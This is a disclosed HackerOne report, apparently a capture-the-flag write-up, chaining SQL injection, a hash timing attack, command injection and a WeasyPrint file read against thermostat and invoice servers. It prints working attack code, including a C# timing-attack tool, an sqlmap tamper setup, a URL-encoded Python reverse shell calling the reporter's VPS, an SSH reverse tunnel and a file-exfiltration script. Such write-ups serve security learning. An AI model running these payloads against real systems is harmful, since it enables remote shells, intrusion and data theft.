{"id":513525,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTM1MjU=","url":"https://hackerone.com/reports/513525","title":"Several vulnerabilities lead to Remote Code Execution and Arbitraty File Read on multiple servers","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-22T01:57:17.816Z","submitted_at":"2019-03-22T01:57:17.816Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dee-see","url":"/dee-see","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:56:59.395Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:56:52.829Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n- Tweeted image contained URL [https://bit.do/h1therm](https://bit.do/h1therm) to download an APK\n- APK API (35.243.186.41) is vulnerable to SQL Injection on `username` parameter and leaked location of server 104.196.12.98 through the `devices` table\n- Login form on 104.196.12.98 is vulnerable to timing attack on `hash` parameter\n- `/update` page on 104.196.12.98 is vulnerable to Server Side Request Forgery on `update_host` parameter\n- Local invoice system vulnerable to Local File Inclusion on page `/invoices/new/pdfize` using weasyprint's attachment feature, which allows reading flag `c8889970d9fb722066f31e804e351993` in `main.py`\n\n## Steps To Reproduce:\nFor details on how an attacker can access the invoice system see the detailed description. These steps assume you have access to the system from your internal network\n\n1. Visit the following URL: [http://172.28.0.3/invoices/pdfize?d=%7B%22companyName%22%3A%22%22%2C%22email%22%3A%22%22%2C%22invoiceNumber%22%3A%22%22%2C%22date%22%3A%22%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22%3C/style%20%22%3A%22%22%2C%22%3E%3Clink%20rel%3Dattachment%20href%3D%5C%22file%3A//main.py%5C%22%20/%3E%22%3A%22%22%7D%7D%7D](http://172.28.0.3/invoices/pdfize?d=%7B%22companyName%22%3A%22%22%2C%22email%22%3A%22%22%2C%22invoiceNumber%22%3A%22%22%2C%22date%22%3A%22%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22%3C/style%20%22%3A%22%22%2C%22%3E%3Clink%20rel%3Dattachment%20href%3D%5C%22file%3A//main.py%5C%22%20/%3E%22%3A%22%22%7D%7D%7D) and download the PDF\n2. Extract the attachment using a PDF reader or the `pdfdetach` command-line tool\n3. Read the `c8889970d9fb722066f31e804e351993` flag\n\n## Detailed description\n### The tweet\n\nThe image tweeted [here](https://pbs.twimg.com/media/D0XoThpW0AE2r8S.png:large) contained a link to download an APK hidden with steganography. I used a tool named [`zsteg`](https://github.com/zed-0xff/zsteg) to extract the information from the image and obtain the URL [https://bit.do/h1therm](https://bit.do/h1therm).\n\n```bash\ncurl -s https://pbs.twimg.com/media/D0XoThpW0AE2r8S.png:large -o tweet.png\nzsteg --bits 1 --channel rgb --lsb --order yx tweet.png\n```\n\n### The APK\n\nI extracted the source code of the APK using a tool named [`jadx`](https://github.com/skylot/jadx) (`jadx h1thermostat.apk -d h1thermostat-apk`) then I created a Java app based on that source code to be able to encrypt and decrypt requests and responses sent to the API at 35.243.186.41, which is the Android application's backend.\n\nThe program is the following:\n\n```java\nimport java.security.Key;\nimport java.security.SecureRandom;\nimport java.security.spec.AlgorithmParameterSpec;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport org.json.JSONObject;\nimport org.json.JSONException;\n\nclass RequestBuilder {\n    public static void main(String[] args) throws Exception {\n        switch (args[0]) {\n        case \"build\":\n            JSONObject obj = new JSONObject();\n            obj.put(\"username\", args[1]);\n            obj.put(\"password\", args[2]);\n            obj.put(\"cmd\", args[3]);\n            if (args.length == 6) {\n                obj.put(args[4], args[5]);\n            }\n            System.out.print(buildPayload(obj));\n            break;\n\n        case \"parse\":\n            System.out.print(parseNetworkResponse(args[1]));\n            break;\n\n        default:\n            break;\n        }\n    }\n\n    private static String buildPayload(JSONObject paramJSONObject) throws Exception {\n        Key key = new SecretKeySpec(\n                new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, \"AES\");\n        byte[] arrayOfByte = new byte[16];\n        new SecureRandom().nextBytes(arrayOfByte);\n        IvParameterSpec localIvParameterSpec = new IvParameterSpec(arrayOfByte);\n        Cipher localCipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        localCipher.init(1, key, localIvParameterSpec);\n        byte[] cipherBytes = localCipher.doFinal(paramJSONObject.toString().getBytes());\n        byte[] localObject = new byte[cipherBytes.length + 16];\n        System.arraycopy(arrayOfByte, 0, localObject, 0, 16);\n        System.arraycopy(cipherBytes, 0, localObject, 16, cipherBytes.length);\n        Base64.Encoder encoder = Base64.getEncoder();\n        return encoder.encodeToString((byte[]) localObject);\n    }\n\n    private static String parseNetworkResponse(String data) throws Exception {\n        Base64.Decoder decoder = Base64.getDecoder();\n        byte[] localObject1 = decoder.decode(data);\n        Object localObject2 = new byte[16];\n        System.arraycopy(localObject1, 0, localObject2, 0, 16);\n        byte[] paramNetworkResponse = new byte[localObject1.length - 16];\n        System.arraycopy(localObject1, 16, paramNetworkResponse, 0, localObject1.length - 16);\n        Key key = new SecretKeySpec(\n                new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, \"AES\");\n        AlgorithmParameterSpec algo = new IvParameterSpec((byte[]) localObject2);\n        Cipher localCipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        localCipher.init(2, key, algo);\n        return new String(localCipher.doFinal(paramNetworkResponse));\n    }\n}\n```\n\nOnce compiled, I used the following bash script to play with the API a bit and discover that it seemed vulnerable to SQL injection.\n\n```bash\npayload=`java -cp org.json.jar:. RequestBuilder build $1 $2 $3 $4 $5` # Parameters are username, password, cmd, commandName (optional), commandArgument (optional)\nresponse=`curl -s -X POST -H \"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\" --data-urlencode \"d=$payload\" http://35.243.186.41/`\njava -cp org.json.jar:. RequestBuilder parse \"$response\"\n```\n\nAfter manual testing and then some poking with [`sqlmap`](http://sqlmap.org/) I discovered that the backend was running on a database named `flitebackend` and that the credentials to log in the Android app were admin/password. Also in this database is the `devices` table which was obtained with the following `sqlmap` command.\n\n```bash\nsqlmap -u http://35.243.186.41/ --dbms=mysql --data \"d=tamper\" --tamper ~/full/path/to/tamper.py --batch --technique T --level=5 --risk=3 --dump -D flitebackend -T devices -C ip -p d\n```\n\nwith `tamper.py` being the following python script\n\n```python\n#!/usr/bin/env python\nimport subprocess\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOWEST\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    result = subprocess.check_output([\"sh\", \"/full/path/to/tamper.sh\", payload])\n    return result\n```\n\nwhich in turn called this bash script\n\n```bash\ncd ~/full/path/top/javaapp\njava -cp org.json.jar:. RequestBuilder build \"$1\" \"123\" \"getTemp\" 2\u003eNUL\nexit 0\n```\n\nIt could have been done directly in python however I'm more familiar with bash. The result of this was that I could obtain the entire `devices` table. Most of the IPs were dead or internal and unreachable to me, however 104.196.12.98 was alive and accessible.\n\n### H1Thermostat (Flitebackend) login\n\nThe login page on 104.196.12.98 hashes the credentials then sends them to the server in a POST request in the `hash` parameter. I noticed that if I sent invalid input (a shorter string for example) the response was immediate, while an invalid user/pass but with a real hash took 500 ms quite reliably. This suggested that the hash was validated byte by byte and a timing attack was possible. After some trial and error it appeared that the timing was `500 * i` where `i` is the 1-based position of the byte. I wrote the following C# application and was able to recover a valid hash: `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`\n\n```csharp\nusing System;\nusing System.Collections.Concurrent;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Http;\nusing System.Threading.Tasks;\n\nnamespace HashTimingAttack\n{\n    class Program\n    {\n        const string Url = \"http://104.196.12.98/\";\n        const string HashParamName = \"hash\";\n        const int HashBytes = 32;\n        private static readonly string[] PossibleValues = Enumerable.Range(0, 256).Select(x =\u003e ((byte)x).ToString(\"x\").PadLeft(2, '0')).ToArray();\n\n        static void Main(string[] args)\n        {\n            Random rnd = new Random();\n            string hash = string.Empty;\n            using (var httpClient = new HttpClient())\n                for (int i = 0; i \u003c HashBytes; i++)\n                {\n                    var desiredTime = (i + 2) * 500;\n                    var @break = false;\n                    foreach (var x in PossibleValues.OrderBy(x =\u003e rnd.Next()))\n                    {\n                        var attempt = (hash + x).PadRight(HashBytes * 2, '0');\n                        var content = new FormUrlEncodedContent(new[] { KeyValuePair.Create(HashParamName, attempt) });\n                        var success = false;\n                        while (!success)\n                        {\n                            try\n                            {\n                                var milliseconds = GetTiming(httpClient, content);\n                                Console.WriteLine($\"[*] {milliseconds} ms for {attempt}.\");\n\n                                if (milliseconds \u003e desiredTime \u0026\u0026 milliseconds \u003c (desiredTime + 99))\n                                {\n                                    Console.WriteLine($\"[+] Found {x}, verifying!\");\n                                    milliseconds = GetTiming(httpClient, content);\n                                    if (milliseconds \u003e desiredTime \u0026\u0026 milliseconds \u003c (desiredTime + 99))\n                                    {\n                                        Console.WriteLine($\"[+] {x} has been double checked and is correct!\");\n                                        hash += x;\n                                        @break = true;\n                                    }\n                                    else\n                                        Console.WriteLine(\"[-] False positive! keep going.\");\n\n                                }\n                                else if (milliseconds \u003c (desiredTime - 500))\n                                {\n                                    Console.Error.WriteLine(\"Picked a wrong branch!\");\n                                    Environment.Exit(1);\n                                }\n\n                                success = true;\n                            }\n                            catch (Exception ex)\n                            {\n                                Console.WriteLine($\"[-] Request failed. Retrying. {ex}\");\n                            }\n                        }\n\n                        if (@break) break;\n                    }\n                }\n        }\n\n        private static long GetTiming(HttpClient httpClient, FormUrlEncodedContent content)\n        {\n            var sw = Stopwatch.StartNew();\n            httpClient.PostAsync(Url, content).Wait();\n            sw.Stop();\n            return sw.ElapsedMilliseconds;\n        }\n    }\n}\n```\n\n### H1Thermostat (Flitebackend) admin page\n\nThe backend has 4 pages: `/main`, `/control`, `/diagnostics` and `/update`. After some fuzzing I discovered the `port` and `update_host` parameters on the `update` page. Anything else than an integer crashed the `port` parameter, however the `update_host` is sent straight to the command line with no validation. This can be verified with [http://104.196.12.98/update?update_host=;%20whoami%20||](http://104.196.12.98/update?update_host=;%20whoami%20||) which reveals we are running commands as `root`.\n\nI setup a netcat listener on my VPS (`nc -lvp 82`) and connected to it using [http://104.196.12.98/update?update_host=%3E/dev/null;%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22173.255.225.46%22%2C82))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call([%22%2Fbin%2Fbash%22%2C%22-i%22])%3B%27%20%26%3E1%20;%20echo](http://104.196.12.98/update?update_host=%3E/dev/null;%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22173.255.225.46%22%2C82))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call([%22%2Fbin%2Fbash%22%2C%22-i%22])%3B%27%20%26%3E1%20;%20echo)\n\nWith that I could install [`nmap`](https://nmap.org/) using `apt`, then I checked the local network mask (using `ip a`, it's 172.28.0.2/16) and scanned the network (`nmap -sP 172.28.0.2/16`) to see if there were other machines I could reach.\n\nThis allowed me to discover an invoicing system on 172.28.0.3. I setup a tunnel to my VPS (`ssh h1@173.255.225.46 -R 0.0.0.0:8001:172.28.0.3:80 -fN -o StrictHostKeyChecking=no -o PubkeyAuthentication=no`) to expose the server externally.\n\nP.S.: While exploring the machine, I saw with `ps aux` that there were other attackers connected, I'm afraid this vulnerability has already been exploited!\n\n### Reports and invoicing system\n\nA combination of factors allows an attacker to read any file on the machine\n\n- The invoice system's `/invoices/new` page, the `/invoices/preview` API and the `/invoices/pdfize` API do not require authentication\n- The `style` property of the JSON object passed in the `d` parameter to `/invoices/pdfize` isn't property sanitized\n  - More precisely, the CSS property names allow HTML characters like `\u003c` and `\u003e`\n- Weasyprint (the library used here) allows including files into the PDF using `\u003clink rel=attachment href=\"PATH\" /\u003e` in the HTML source for the PDF\n  - It's a [documented feature](https://weasyprint.readthedocs.io/en/stable/features.html?highlight=attachment#pdf)\n  - The information about weasyprint was leaked using a `background-image` CSS property to load an attacker-controlled image\n  - The vendor and version (weasyprint 44) were in the HTTP headers\n\nWith all of this, I could make the following bash script to download any file from the server\n\n```bash\nVPS_IP=\"173.255.225.46\"\nVPS_PORT=\"80\"\n\nFILEPATH=\"main.py\" # Path of the file to download. Can be relative to where the app is running or absolute.\n\nQUERY=\"{\\\"companyName\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"invoiceNumber\\\":\\\"\\\",\\\"date\\\":\\\"\\\",\\\"items\\\":[[\\\"1\\\",\\\"\\\",\\\"\\\",\\\"10\\\"]],\\\"styles\\\":{\\\"body\\\":{\\\"\u003c/style \\\":\\\"\\\",\\\"\u003e\u003clink rel=attachment href=\\\\\\\"file://$FILEPATH\\\\\\\" /\u003e\\\":\\\"\\\"}}}\"\nENCODED_QUERY=$(python -c \"import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))\" \"$QUERY\") # python3\n\ncurl \"http://$VPS_IP:$VPS_PORT/invoices/preview?d=$ENCODED_QUERY\" -o ./50m-ctf/pdfize.pdf\n\npdfdetach -save 1 -o \"./50m-ctf/$(basename $FILEPATH)\" ./50m-ctf/pdfize.pdf\n```\n\nReading the `main.py` allows an attacker to read the `c8889970d9fb722066f31e804e351993` flag.\n\n## Impact\n\nThe 104.196.12.98 server is completely compromised and an attacker could, among other things, take the service down or modify the application to serve bad content to unsuspecting users.\n\nThe local machine serving the invoices system is vulnerable to arbitrary file read and nothing on that machine can be considered private anymore.\n\nEvidence suggests that these vulnerabilities have already been exploited and the machines are already compromised.","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-05-08T15:56:52.950Z","allow_singular_disclosure_after":-76633901.70919316,"singular_disclosure_allowed":true,"vote_count":21,"voters":["0xsaltyhashes","al-madjus","nytr0gen","checkm50","dee-see","pirateducky","ali","lordjerry0x01","since2003","akashhamal0x01","and 11 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4492840,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:33:17.419Z","updated_at":"2019-04-05T18:33:17.419Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dee-see","url":"/dee-see"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509104,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:56:52.898Z","updated_at":"2019-04-08T15:56:52.898Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509105,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-04-08T15:56:59.347Z","updated_at":"2019-04-08T15:56:59.347Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}